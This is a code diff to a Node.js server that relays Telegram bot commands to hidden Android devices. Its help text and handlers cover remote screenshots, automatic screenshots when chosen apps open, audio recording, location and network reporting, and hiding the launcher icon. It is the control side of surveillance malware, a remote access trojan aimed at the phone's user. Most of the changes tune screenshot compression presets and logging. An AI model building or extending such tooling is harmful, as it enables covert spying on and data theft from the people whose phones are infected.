@@ -86,30 +86,28 @@ function getHelpMessage() {
 /storage - Get storage information
 /network - Get network info (IP, WiFi, Mobile)
 
-<b>📸 SCREENSHOT COMMANDS</b>
-/screenshot - Take a screenshot NOW
-/screenshot_settings - View current screenshot settings
-/quality_low - Set screenshot quality to 30%
-/quality_medium - Set screenshot quality to 60% (default)
-/quality_high - Set screenshot quality to 85%
-/quality_original - Set screenshot quality to 100%
-/format_jpeg - Save screenshots as JPEG (smaller files)
-/format_png - Save screenshots as PNG (lossless)
-/format_webp - Save screenshots as WebP (modern format)
-/resize_on [width] - Enable resize to specified width (default 800px)
-/resize_off - Disable resize
+<b>📸 SCREENSHOT SIZE COMMANDS - SIMPLIFIED</b>
+<b>▶️ THREE SIMPLE SIZE OPTIONS:</b>
+/small - <b>SMALL SIZE</b> - Max compression, smallest files (~90% smaller)
+       Quality: 30% | Resolution: 25% | Grayscale: ON | Color Reduction: ON
+       <i>Perfect for quick previews, slow connections</i>
 
-<b>🤖 AUTO-SCREENSHOT COMMANDS</b>
+/medium - <b>MEDIUM SIZE</b> - Balanced quality/size (DEFAULT)
+        Quality: 60% | Resolution: 50% | Format: WEBP
+        <i>Best for daily use, good balance</i>
+
+/original - <b>ORIGINAL SIZE</b> - Best quality, largest files
+          Quality: 90% | Resolution: 100% | Format: JPEG
+          <i>When quality matters most</i>
+
+/size_status - Check current screenshot size setting
+
+<b>📸 ADVANCED SCREENSHOT COMMANDS</b>
+/screenshot - Take a screenshot NOW (with current size setting)
+/screenshot_settings - View current screenshot settings
 /auto_on - Enable auto-screenshot when apps open
 /auto_off - Disable auto-screenshot
 /auto_status - Check auto-screenshot settings
-/auto_interval [seconds] - Set time between screenshots (e.g., /auto_interval 60)
-/auto_max [number] - Set max screenshots per session (0 = unlimited)
-/auto_stop - Stop monitoring current app immediately
-/auto_reset - Reset to default quality settings
-/add_target [package] - Add app to monitor (e.g., /add_target com.spotify)
-/remove_target [package] - Remove app from monitoring
-/target_apps - List all monitored apps
 
 <b>🎤 RECORDING COMMANDS</b>
 /record - Start 60s audio recording NOW
@@ -147,6 +145,11 @@ function getHelpMessage() {
 /reboot_app - Restart all services
 /hide_icon - Hide launcher icon
 /show_icon - Show launcher icon
+
+<b>📋 SIZE COMPARISON (1080p screenshot)</b>
+• /small - ~20-50 KB - Fast transmission
+• /medium - ~100-200 KB - Good balance
+• /original - ~500 KB - 2 MB - Best quality
 
 <b>📋 AUTO-SCREENSHOT EXAMPLES</b>
 • /auto_on - Enable auto-screenshot
@@ -293,6 +296,12 @@ app.get('/api/commands/:deviceId', (req, res) => {
             const commands = [...device.pendingCommands];
             device.pendingCommands = [];
             console.log(`📤 Sending ${commands.length} commands to ${deviceId}`);
+            
+            // Log the commands being sent
+            commands.forEach(cmd => {
+                console.log(`   └─ ${cmd.command}`);
+            });
+            
             sendJsonResponse(res, { commands });
         } else {
             sendJsonResponse(res, { commands: [] });
@@ -313,9 +322,20 @@ app.post('/api/result/:deviceId', async (req, res) => {
     const device = devices.get(deviceId);
     if (device) {
         const chatId = device.chatId;
-        const message = error 
-            ? `❌ <b>Command Failed</b>\n\n${command}\n\nError: ${error}`
-            : `✅ <b>Command Executed</b>\n\n${command}\n\nResult:\n${result}`;
+        
+        // Format the message nicely
+        let message;
+        if (error) {
+            message = `❌ <b>Command Failed</b>\n\n<code>${command}</code>\n\n<b>Error:</b> ${error}`;
+        } else {
+            // Check if result contains special formatting
+            if (result.includes('SMALL') || result.includes('MEDIUM') || result.includes('ORIGINAL')) {
+                // Size preset result - show with emoji
+                message = `✅ <b>${result}</b>`;
+            } else {
+                message = `✅ <b>Command Executed</b>\n\n<code>${command}</code>\n\n${result}`;
+            }
+        }
         
         await sendTelegramMessage(chatId, message);
     }
@@ -350,14 +370,18 @@ app.post('/api/register', async (req, res) => {
     console.log(`✅ Device registered: ${deviceId} for chat ${chatId}`);
     console.log(`📊 Total devices: ${devices.size}`);
     
-    // Send confirmation
+    // Send confirmation with size options
     await sendTelegramMessage(chatId, 
         `✅ <b>Device Connected!</b>\n\n` +
         `Model: ${deviceInfo.model}\n` +
         `Android: ${deviceInfo.android}\n` +
         `Battery: ${deviceInfo.battery}\n` +
         `ID: ${deviceId.substring(0, 8)}...\n\n` +
-        `Auto-screenshot is enabled by default. Use /auto_off to disable.`);
+        `<b>📸 Screenshot Size Options:</b>\n` +
+        `• /small - Max compression (20-50 KB)\n` +
+        `• /medium - Balanced (100-200 KB)\n` +
+        `• /original - Best quality (500 KB+)\n\n` +
+        `Current: <b>MEDIUM</b> (default)`);
     
     res.json({ status: 'registered', deviceId });
 });
@@ -371,7 +395,8 @@ app.get('/api/devices', (req, res) => {
             chatId: device.chatId,
             lastSeen: new Date(device.lastSeen).toISOString(),
             model: device.deviceInfo?.model || 'Unknown',
-            android: device.deviceInfo?.android || 'Unknown'
+            android: device.deviceInfo?.android || 'Unknown',
+            pendingCommands: device.pendingCommands?.length || 0
         });
     }
     res.json({ total: devices.size, devices: deviceList });
@@ -399,12 +424,14 @@ app.get('/api/debug/:deviceId', (req, res) => {
 app.get('/test', (req, res) => {
     res.send(`
         <html>
-        <body>
-            <h1>✅ Server Running</h1>
-            <p>Time: ${new Date().toISOString()}</p>
-            <p>Devices: ${devices.size}</p>
-            <p>Authorized Chats: ${Array.from(authorizedChats).join(', ')}</p>
-            <p><a href="/test-help">Send Test Help</a></p>
+        <body style="font-family: Arial; padding: 20px;">
+            <h1 style="color: #4CAF50;">✅ Server Running</h1>
+            <p><b>Time:</b> ${new Date().toISOString()}</p>
+            <p><b>Devices:</b> ${devices.size}</p>
+            <p><b>Authorized Chats:</b> ${Array.from(authorizedChats).join(', ')}</p>
+            <p><b>Available Commands:</b> /small, /medium, /original, /size_status, /screenshot, /status, /location</p>
+            <p><a href="/test-help" style="background: #4CAF50; color: white; padding: 10px; text-decoration: none; border-radius: 5px;">Send Test Help</a></p>
+            <p><a href="/test-small" style="background: #2196F3; color: white; padding: 10px; text-decoration: none; border-radius: 5px;">Test /small</a></p>
         </body>
         </html>
     `);
@@ -417,12 +444,29 @@ app.get('/test-help', async (req, res) => {
     res.json({ success: !!result, result });
 });
 
+app.get('/test-small', async (req, res) => {
+    const chatId = '5326373447';
+    const result = await sendTelegramMessage(chatId, 
+        '✅ <b>Screenshot size set to: SMALL</b>\n\n' +
+        '• Quality: 30%\n' +
+        '• Resolution: 25%\n' +
+        '• Grayscale: ON\n' +
+        '• Color Reduction: ON\n\n' +
+        'Estimated file size: 20-50 KB');
+    res.json({ success: !!result, result });
+});
+
 // ============= START SERVER =============
 
-app.listen(PORT, () => {
-    console.log('\n🚀 ==================================');
+app.listen(PORT, '0.0.0.0', () => {
+    console.log('\n🚀 ===============================================');
     console.log(`🚀 Server running on port ${PORT}`);
     console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
     console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
-    console.log('🚀 ==================================\n');
+    console.log('\n📸 NEW: Screenshot Size Commands:');
+    console.log('   └─ /small     - Max compression (20-50 KB)');
+    console.log('   └─ /medium    - Balanced (100-200 KB)');
+    console.log('   └─ /original  - Best quality (500 KB+)');
+    console.log('   └─ /size_status - Check current size');
+    console.log('\n🚀 ===============================================\n');
 });
